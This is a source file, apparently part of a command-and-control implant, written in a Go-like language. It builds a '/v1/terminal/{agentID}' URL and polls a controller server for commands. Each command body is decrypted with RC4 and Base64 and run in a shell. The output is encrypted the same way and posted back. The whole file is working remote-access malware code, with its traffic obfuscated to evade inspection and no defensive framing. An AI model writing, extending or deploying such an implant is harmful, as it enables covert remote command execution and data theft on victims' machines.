// Package c2 - terminal poll: GET command, shell, POST output (RC4+Base64 bodies).
package c2

import "std/runtime"
import "std/net"
import "std/process"
import "std/strings"

// terminalURL builds baseURL + "/v1/terminal/" + agentID (heap). Caller Free.
fn terminalURL(baseURL: *u8, agentID: *u8) -> (*u8, *u8) {
    if baseURL == null || agentID == null {
        return null, "c2: null url"
    }
    var base: *u8 = baseURL
    var n: u64 = __strlen(base)
    if n > 0 {
        if *(base + n - 1) == 47 {
            var raw: *void
            var err0: *u8
            raw, err0 = runtime.Alloc(n)
            if err0 != 0 {
                return null, err0
            }
            var b: *u8 = cast[*u8](raw)
            var i: u64 = 0
            while i < n - 1 {
                *(b + i) = *(base + i)
                i = i + 1
            }
            *(b + n - 1) = 0
            mid, err1 := strings.Append(b, "/v1/terminal/")
            runtime.Free(b)
            if err1 != 0 {
                return null, err1
            }
            defer runtime.Free(mid)
            return strings.Append(mid, agentID)
        }
    }
    mid2, err2 := strings.Append(base, "/v1/terminal/")
    if err2 != 0 {
        return null, err2
    }
    defer runtime.Free(mid2)
    return strings.Append(mid2, agentID)
}

// PollTerminal performs one C2 cycle with RC4+Base64 body obfuscation:
//   GET  {base}/v1/terminal/{agentID}
//   if 204 -> done
//   else Open(body) -> shell -> Seal(stdout) -> POST
//
// key/keyLen must match the C2 server -key.
fn PollTerminal(baseURL: *u8, agentID: *u8, key: *u8, keyLen: u64) -> *u8 {
    url, err := terminalURL(baseURL, agentID)
    if err != 0 {
        return err
    }
    defer runtime.Free(url)

    resp, err2 := net.Get(url)
    if err2 != 0 {
        return err2
    }
    defer net.FreeResponse(resp)

    if resp.status == 204 {
        return 0
    }
    if resp.body == null {
        return 0
    }
    if resp.bodyLen == 0 {
        return 0
    }

    cmd, cmdN, err3 := Open(resp.body, key, keyLen)
    if err3 != 0 {
        return err3
    }
    defer runtime.Free(cmd)
    if cmdN == 0 {
        return 0
    }

    out, err4 := process.ShellOutput(cmd)
    if err4 != 0 {
        return err4
    }
    defer free(out)

    var plain: *u8 = null
    var plen: u64 = 0
    if len(out) > 0 {
        plain = &out[0]
        plen = len(out)
    }
    sealed, err5 := Seal(plain, plen, key, keyLen)
    if err5 != 0 {
        return err5
    }
    defer runtime.Free(sealed)

    post, err6 := net.Post(url, "text/plain", sealed, __strlen(sealed))
    if err6 != 0 {
        return err6
    }
    net.FreeResponse(post)
    return 0
}
